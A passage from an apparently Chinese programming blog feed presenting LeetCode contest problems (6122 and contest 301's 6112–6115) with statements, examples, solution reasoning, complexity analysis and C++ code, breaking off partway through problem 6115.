class="built_in">end</span>());</span><br><span class="line">            ans[i] = suffix[k - <span class="number">1</span>].second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>基数排序<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">smallestTrimmedNumbers</span><span class="params">(vector&lt;string&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len = nums[<span class="number">0</span>].<span class="built_in">size</span>();      </span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">suffix</span>(len + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            suffix[<span class="number">0</span>].<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">cnt</span>(<span class="number">10</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="type">int</span> index = suffix[i<span class="number">-1</span>][j];</span><br><span class="line">                <span class="type">char</span> c = nums[index][len - i];</span><br><span class="line">                cnt[c - <span class="string">&#x27;0&#x27;</span>].<span class="built_in">emplace_back</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> x : cnt[j]) &#123;</span><br><span class="line">                    suffix[i].<span class="built_in">emplace_back</span>(x);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> k = queries[i][<span class="number">0</span>], trim = queries[i][<span class="number">1</span>];</span><br><span class="line">            ans[i] = suffix[trim][k - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="6122-使数组可以被整除的最少删除次数"><a href="#6122-使数组可以被整除的最少删除次数" class="headerlink" title="6122. 使数组可以被整除的最少删除次数"></a>6122. 使数组可以被整除的最少删除次数</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个正整数数组 <code>nums</code> 和 <code>numsDivide</code> 。你可以从 nums 中删除任意数目的元素。</p>
<p>请你返回使 <code>nums</code> 中 最小 元素可以整除 <code>numsDivide</code> 中所有元素的 最少 删除次数。如果无法得到这样的元素，返回 <code>-1</code> 。</p>
<p>如果 <code>y % x == 0</code> ，那么我们说整数 <code>x</code> 整除 <code>y</code> 。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,3,2,4,3], numsDivide = [9,6,9,3,15]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">[2,3,2,4,3] 中最小元素是 2 ，它无法整除 numsDivide 中所有元素。</span><br><span class="line">我们从 nums 中删除 2 个大小为 2 的元素，得到 nums = [3,4,3] 。</span><br><span class="line">[3,4,3] 中最小元素为 3 ，它可以整除 numsDivide 中所有元素。</span><br><span class="line">可以证明 2 是最少删除次数。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,3,6], numsDivide = [8,2,6,10]</span><br><span class="line">输出：-1</span><br><span class="line">解释：</span><br><span class="line">我们想 nums 中的最小元素可以整除 numsDivide 中的所有元素。</span><br><span class="line">没有任何办法可以达到这一目的。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length, numsDivide.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], numsDivide[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-deletions-to-make-array-divisible">https://leetcode.cn/problems/minimum-deletions-to-make-array-divisible</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉是最简单的<code>T4</code>了。如果要被数组 $numsDivide$ 中所有的元素整除，则该数最大只能为数组中所有元素的最大公约数了 $maxgcd$, 如果 $nums$ 中的最小元素能够整除$maxgcd$，则表示当前 $nums$ 中的最小元素符合要求。</li>
</ol>
<ul>
<li>首先求出数组的最大公约数 $maxgcd$；</li>
<li>然后将数组 $nums$ 按照从小到大排序，我们依次尝试数组中的元素，能否被 $maxgcd$ 整除，如果可以整除返回即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m + n\log n)$，$n$ 表示数组 $nums$ 的长度，$m$ 表示数组 $numsDivide$ 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; numsDivide)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = numsDivide.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> maxGcd = numsDivide[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            maxGcd = __gcd(maxGcd, numsDivide[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((maxGcd % nums[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode conttest 301</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/16/</url>
    <content><![CDATA[<h2 id="leetcode-conttest-301"><a href="#leetcode-conttest-301" class="headerlink" title="leetcode conttest 301"></a>leetcode conttest 301</h2><p>周赛的质量终于又好起来了，最后一题难度果真上去了。</p>
<h3 id="6112-装满杯子需要的最短总时长"><a href="#6112-装满杯子需要的最短总时长" class="headerlink" title="6112. 装满杯子需要的最短总时长"></a>6112. 装满杯子需要的最短总时长</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>现有一台饮水机，可以制备冷水、温水和热水。每秒钟，可以装满 <code>2</code> 杯 不同 类型的水或者 <code>1</code> 杯任意类型的水。</p>
<p>给你一个下标从 <code>0</code> 开始、长度为 3 的整数数组 <code>amount</code> ，其中 <code>amount[0]</code>、<code>amount[1]</code> 和 <code>amount[2]</code> 分别表示需要装满冷水、温水和热水的杯子数量。返回装满所有杯子所需的 最少 秒数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：amount = [1,4,2]</span><br><span class="line">输出：4</span><br><span class="line">解释：下面给出一种方案：</span><br><span class="line">第 1 秒：装满一杯冷水和一杯温水。</span><br><span class="line">第 2 秒：装满一杯温水和一杯热水。</span><br><span class="line">第 3 秒：装满一杯温水和一杯热水。</span><br><span class="line">第 4 秒：装满一杯温水。</span><br><span class="line">可以证明最少需要 4 秒才能装满所有杯子。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：amount = [5,4,4]</span><br><span class="line">输出：7</span><br><span class="line">解释：下面给出一种方案：</span><br><span class="line">第 1 秒：装满一杯冷水和一杯热水。</span><br><span class="line">第 2 秒：装满一杯冷水和一杯温水。</span><br><span class="line">第 3 秒：装满一杯冷水和一杯温水。</span><br><span class="line">第 4 秒：装满一杯温水和一杯热水。</span><br><span class="line">第 5 秒：装满一杯冷水和一杯热水。</span><br><span class="line">第 6 秒：装满一杯冷水和一杯温水。</span><br><span class="line">第 7 秒：装满一杯热水。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：amount = [5,0,0]</span><br><span class="line">输出：5</span><br><span class="line">解释：每秒装满一杯冷水。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>amount.length == 3</code></li>
<li><code>0 &lt;= amount[i] &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/evaluate-boolean-binary-tree">https://leetcode.cn/problems/evaluate-boolean-binary-tree</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题 + 贪心匹配
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>假设满足 $a \le b \le c$ 条件，分以下两种情况讨论:</li>
</ol>
<ul>
<li>$a + b \le c$, 此时需要的时间为 $c$ 秒；</li>
<li>$a + b &gt; c$，次时需要的时间为 $\lceil \frac{a + b - c}{2}\rceil + c$. 设 $t &#x3D; a + b -c$，$x &#x3D; \lfloor \frac{t}{2}\rfloor$，此时满足我们知道一定满足 $a &gt;&#x3D; x$, 否则就不会满足 $b \le c$ 这个条件了，<ul>
<li>此时如果 $t$ 为偶数，我们令 $a &#x3D; \frac{t}{2} + a - \frac{t}{2}, b &#x3D; \frac{t}{2} + b - \frac{t}{2}$, 此时需要的时间即为 $c + \frac{t}{2}$。</li>
<li>此时如果 $t$ 为奇数，我们令 $a &#x3D; x - 1 + (a - x + 1), b &#x3D; x + b - x$,此时需要的时间即为 $c + x$。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fillCups</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; amount)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(amount.<span class="built_in">begin</span>(), amount.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">if</span> (amount[<span class="number">0</span>] + amount[<span class="number">1</span>] &lt;= amount[<span class="number">2</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> amount[<span class="number">2</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> rest = amount[<span class="number">0</span>] + amount[<span class="number">1</span>] - amount[<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">return</span> (rest + <span class="number">1</span>) / <span class="number">2</span> + amount[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6113-无限集中的最小数字"><a href="#6113-无限集中的最小数字" class="headerlink" title="6113. 无限集中的最小数字"></a>6113. 无限集中的最小数字</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>现有一个包含所有正整数的集合 <code>[1, 2, 3, 4, 5, ...] </code>。</p>
<p>实现 <code>SmallestInfiniteSet</code> 类：</p>
<ul>
<li><code>SmallestInfiniteSet()</code> 初始化 <code>SmallestInfiniteSet</code> 对象以包含 所有 正整数。</li>
<li><code>int popSmallest()</code> 移除 并返回该无限集中的最小整数。</li>
<li><code>void addBack(int num)</code> 如果正整数 <code>num</code> 不 存在于无限集中，则将一个 <code>num</code> 添加 到该无限集中。</li>
</ul>
<p> </p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">[&quot;SmallestInfiniteSet&quot;, &quot;addBack&quot;, &quot;popSmallest&quot;, &quot;popSmallest&quot;, &quot;popSmallest&quot;, &quot;addBack&quot;, &quot;popSmallest&quot;, &quot;popSmallest&quot;, &quot;popSmallest&quot;]</span><br><span class="line">[[], [2], [], [], [], [1], [], [], []]</span><br><span class="line">输出</span><br><span class="line">[null, null, 1, 2, 3, null, 1, 4, 5]</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">SmallestInfiniteSet smallestInfiniteSet = new SmallestInfiniteSet();</span><br><span class="line">smallestInfiniteSet.addBack(2);    // 2 已经在集合中，所以不做任何变更。</span><br><span class="line">smallestInfiniteSet.popSmallest(); // 返回 1 ，因为 1 是最小的整数，并将其从集合中移除。</span><br><span class="line">smallestInfiniteSet.popSmallest(); // 返回 2 ，并将其从集合中移除。</span><br><span class="line">smallestInfiniteSet.popSmallest(); // 返回 3 ，并将其从集合中移除。</span><br><span class="line">smallestInfiniteSet.addBack(1);    // 将 1 添加到该集合中。</span><br><span class="line">smallestInfiniteSet.popSmallest(); // 返回 1 ，因为 1 在上一步中被添加到集合中，</span><br><span class="line">                                   // 且 1 是最小的整数，并将其从集合中移除。</span><br><span class="line">smallestInfiniteSet.popSmallest(); // 返回 4 ，并将其从集合中移除。</span><br><span class="line">smallestInfiniteSet.popSmallest(); // 返回 5 ，并将其从集合中移除。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= num &lt;= 1000</code></li>
<li>最多调用 <code>popSmallest</code> 和 <code>addBack</code> 方法 共计 <code>1000</code> 次</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/smallest-number-in-infinite-set">https://leetcode.cn/problems/smallest-number-in-infinite-set</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>设计问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>比较简单的问题，对所有去掉的数用哈希表记录下。</li>
</ol>
<ul>
<li><code>popSmallest</code>: 我们从最小的 $1$ 开始增加，直到其不在哈希表存在记录。</li>
<li><code>addBack</code>：我们将 $num$ 从哈希表中删除即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：<code>popSmallest</code> 函数的时间复杂度为 $O(n)$，<code>addBack</code> 函数的时间复杂度为 $O(1)$。$n$ 表示函数调用的次数。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SmallestInfiniteSet</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">SmallestInfiniteSet</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">popSmallest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (remove.<span class="built_in">count</span>(i)) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        remove.<span class="built_in">emplace</span>(i);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addBack</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (remove.<span class="built_in">count</span>(num)) &#123;</span><br><span class="line">            remove.<span class="built_in">erase</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_set&lt;<span class="type">int</span>&gt; remove;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your SmallestInfiniteSet object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * SmallestInfiniteSet* obj = new SmallestInfiniteSet();</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;popSmallest();</span></span><br><span class="line"><span class="comment"> * obj-&gt;addBack(num);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="6114-移动片段得到字符串"><a href="#6114-移动片段得到字符串" class="headerlink" title="6114. 移动片段得到字符串"></a>6114. 移动片段得到字符串</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个字符串 <code>start</code> 和 <code>target</code> ，长度均为<code>n</code> 。每个字符串 仅 由字符 <code>&#39;L&#39;、&#39;R&#39;</code> 和 <code>&#39;_&#39;</code> 组成，其中：</p>
<p>字符 <code>&#39;L&#39;</code> 和 <code>&#39;R&#39;</code> 表示片段，其中片段 ‘L’ 只有在其左侧直接存在一个 空位 时才能向 左 移动，而片段 ‘R’ 只有在其右侧直接存在一个 空位 时才能向 右 移动。<br>字符 ‘_’ 表示可以被 任意 ‘L’ 或 ‘R’ 片段占据的空位。<br>如果在移动字符串 <code>start</code> 中的片段任意次之后可以得到字符串 <code>target</code> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：start = &quot;_L__R__R_&quot;, target = &quot;L______RR&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：可以从字符串 start 获得 target ，需要进行下面的移动：</span><br><span class="line">- 将第一个片段向左移动一步，字符串现在变为 &quot;L___R__R_&quot; 。</span><br><span class="line">- 将最后一个片段向右移动一步，字符串现在变为 &quot;L___R___R&quot; 。</span><br><span class="line">- 将第二个片段向右移动散步，字符串现在变为 &quot;L______RR&quot; 。</span><br><span class="line">可以从字符串 start 得到 target ，所以返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：start = &quot;R_L_&quot;, target = &quot;__LR&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：字符串 start 中的 &#x27;R&#x27; 片段可以向右移动一步得到 &quot;_RL_&quot; 。</span><br><span class="line">但是，在这一步之后，不存在可以移动的片段，所以无法从字符串 start 得到 target 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：start = &quot;_R&quot;, target = &quot;R_&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：字符串 start 中的片段只能向右移动，所以无法从字符串 start 得到 target 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == start.length == target.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>start</code> 和 <code>target</code> 由字符 <code>&#39;L&#39;、&#39;R&#39;</code> 和 <code>&#39;_&#39;</code> 组成</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/move-pieces-to-obtain-a-string">https://leetcode.cn/problems/move-pieces-to-obtain-a-string</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉就是直接模拟，我们依次记录 $start, target$ 中所有出现出现的 <code>L,R</code> 以及其位置，字符即为字符串 $s_1,s_2$, 索引数组记录为 $p_1,p_2$, 二者比较如下：</li>
</ol>
<ul>
<li>如果目标字符串的长度不相等，则直接返回 <code>false</code>;</li>
<li>对于第 $i$ 个字符，如果不满足 $s_1[i] &#x3D; s_2[i]$ 则直接返回错误；</li>
<li>对于第 $i$ 个字符:<ul>
<li>如果 $s_1[i] &#x3D; \texttt{‘L’}$, 此时字符只能向左移动，如果不能满足 $p_1[i] \ge p_2[i]$, 则应该返回错误；</li>
<li>如果 $s_1[i] &#x3D; \texttt{‘R’}$, 此时字符只能向右移动，如果不能满足 $p_1[i] \le p_2[i]$, 则应该返回错误；</li>
</ul>
</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, $n$ 表示给定的字符串的长度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示给定的字符串的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canChange</span><span class="params">(string start, string target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = start.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">char</span>,<span class="type">int</span>&gt;&gt; arr1;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">char</span>,<span class="type">int</span>&gt;&gt; arr2;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target[i] == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                arr2.<span class="built_in">emplace_back</span>(<span class="string">&#x27;L&#x27;</span>, i);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(target[i] == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                arr2.<span class="built_in">emplace_back</span>(<span class="string">&#x27;R&#x27;</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (start[i] == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                arr1.<span class="built_in">emplace_back</span>(<span class="string">&#x27;L&#x27;</span>, i);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (start[i] == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                arr1.<span class="built_in">emplace_back</span>(<span class="string">&#x27;R&#x27;</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (arr1.<span class="built_in">size</span>() != arr2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> m = arr1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [ch1, idx1] = arr1[i];</span><br><span class="line">            <span class="keyword">auto</span> [ch2, idx2] = arr2[i];</span><br><span class="line">            <span class="keyword">if</span> (ch1 != ch2) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ch1 == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (idx1 &lt; idx2) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (idx1 &gt; idx2) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6115-统计理想数组的数目"><a href="#6115-统计理想数组的数目" class="headerlink" title="6115. 统计理想数组的数目"></a>6115. 统计理想数组的数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个整数 <code>n</code> 和 <code>maxValue</code> ，用于描述一个 理想数组 。</p>
<p>对于下标从 <code>0</code> 开始、长度为 <code>n</code> 的整数数组 <code>arr</code> ，如果满足以下条件，则认为该数组是一个 理想数组 ：</p>
<ul>
<li>每个 <code>arr[i]</code> 都是从 <code>1</code> 到 <code>maxValue</code> 范围内的一个值，其中 <code>0 &lt;= i &lt; n</code> 。</li>
<li>每个 <code>arr[i]</code> 都可以被 <code>arr[i - 1]</code> 整除，其中 <code>0 &lt; i &lt; n</code> 。<br>返回长度为 <code>n</code> 的 不同 理想数组的数目。由于答案可能很大，返回对 <code>109 + 7</code> 取余的结果。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2, maxValue = 5</span><br><span class="line">输出：10</span><br><span class="line">解释：存在以下理想数组：</span><br><span class="line">- 以 1 开头的数组（5 个）：[1,1]、[1,2]、[1,3]、[1,4]、[1,5]</span><br><span class="line">- 以 2 开头的数组（2 个）：[2,2]、[2,4]</span><br><span class="line">- 以 3 开头的数组（1 个）：[3,3]</span><br><span class="line">- 以 4 开头的数组（1 个）：[4,4]</span><br><span class="line">- 以 5 开头的数组（1 个）：[5,5]</span><br><span class="line">共计 5 + 2 + 1 + 1 + 1 = 10 个不同理想数组。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 5, maxValue = 3</span><br><span class="line">输出：11</span><br><span class="line">解释：存在以下理想数组：</span><br><span class="line">- 以 1 开头的数组（9 个）：</span><br><span class="line">   - 不含其他不同值（1 个）：[1,1,1,1,1] </span><br><span class="line">   - 含一个不同值 2（4 个）：[1,1,1,1,2], [1,1,1,2,2], [1,1,2,2,2], [1,2,2,2,2]</span><br><span class="line">   - 含一个不同值 3（4 个）：[1,1,1,1,3], [1,1,1,3,3], [1,1,3,3,3], [1,3,3,3,3]</span><br><span class="line">- 以 2 开头的数组（1 个）：[2,2,2,2,2]</span><br><span class="line">- 以 3 开头的数组（1 个）：[3,3,3,3,3]</span><br><span class="line">共计 9 + 1 + 1 = 11 个不同理想数组。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= n &lt;= 104</code></li>
<li><code>1 &lt;= maxValue &lt;= 104</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/count-the-number-of-ideal-arrays">https://leetcode.cn/problems/count-the-number-of-ideal-arrays</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划 + 组合数学
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>难得见到质量非常高的数学题目，比赛的时候没有做出来。虽然题目挺难，加一些数学的理论，但是还是感觉这类题目有意思，有思考的深度。</li>
</ol>
<ul>
